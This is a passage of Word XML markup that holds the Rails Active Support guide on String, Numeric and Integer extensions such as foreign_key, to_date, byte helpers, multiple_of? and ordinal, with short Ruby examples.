          <w:p w14:paraId="0BA9CDD8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Admin::Session".foreign_key # =&gt; "session_id"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2623B29C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Pass a false argument if you do not want the underscore in “_id”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6EB51915" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4287CC4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1029645621"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"User".foreign_key(false) # =&gt; "userid"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3490318B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Associations use this method to infer foreign keys, for example </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> do this: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9D35A82" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1AC95F2A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># active_record/associations.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A54948B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>foreign_key = options[:foreign_key] || reflection.active_record.name.foreign_key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1C44080B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F5472A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.10 Conversions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B806CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.10.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_date</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_datetime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E9B9B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_date</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_datetime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are basically convenience wrappers around </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date._parse</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4B92877C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B869A30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"2010-07-27".to_date              # =&gt; Tue, 27 Jul 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25D6152E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"2010-07-27 23:37:00".to_time     # =&gt; Tue Jul 27 23:37:00 UTC 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20F7555D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"2010-07-27 23:37:00".to_datetime # =&gt; Tue, 27 Jul 2010 23:37:00 +0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4F646A73" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> receives an optional argument </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:utc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:local</w:t>
      </w:r>
      <w:r>
        <w:t>, to indicate which time zone you want the time in:</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50D6B43" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A54A5C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"2010-07-27 23:42:00".to_time(:utc)   # =&gt; Tue Jul 27 23:42:00 UTC 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C68A1A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"2010-07-27 23:42:00".to_time(:local) # =&gt; Tue Jul 27 23:42:00 +0200 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7ED8D828" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Default is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:utc</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE9692C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Please refer to the documentation of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date._parse</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for further details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18749387" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The three of them return </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for blank receivers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4C7404" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/conversions.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0B8C5A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">6 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Numeric</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09143CCE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 Bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686D51B9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>All numbers respond to these methods:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3BCC9A7C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44E50A76" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>bytes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21CF2C0F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>kilobytes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23D9F11A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>megabytes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B032804" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gigabytes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43231CC9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>terabytes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35142443" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>petabytes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60BFDEA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>exabytes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="334F5247" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>They return the corresponding amount of bytes, using a conversion factor of 1024:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="00674447" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="05142F5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2.kilobytes   # =&gt; 2048</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72698D6C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>3.megabytes   # =&gt; 3145728</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5663607E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>3.5.gigabytes # =&gt; 3758096384</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D79B025" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>-4.exabytes   # =&gt; -4611686018427387904</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="14B2FA30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Singular forms are aliased so you are able to say:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2760"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="507F1658" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3134C53A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="652685277"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1.megabyte # =&gt; 1048576</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="36891CF0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/numeric/bytes.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4527FD67" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Integer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A312692" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>multiple_of?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA173D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>multiple_of?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tests whether an integer is multiple of the argument:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6CF3A704" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5EE535C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2.multiple_of?(1) # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A4BE743" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1.multiple_of?(2) # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A5B2EB3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/integer/multiple.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771B78BE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ordinal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F40A8E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ordinal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the ordinal suffix string corresponding to the receiver integer:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3000"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4203F998" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7445DB66" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1.ordinal    # =&gt; "st"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36FED4F6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2.ordinal    # =&gt; "nd"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="693CB369" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>53.ordinal   # =&gt; "rd"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58BBBF60" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2009.ordinal # =&gt; "th"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35A9A5DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>-21.ordinal  # =&gt; "st"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="484CB68C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
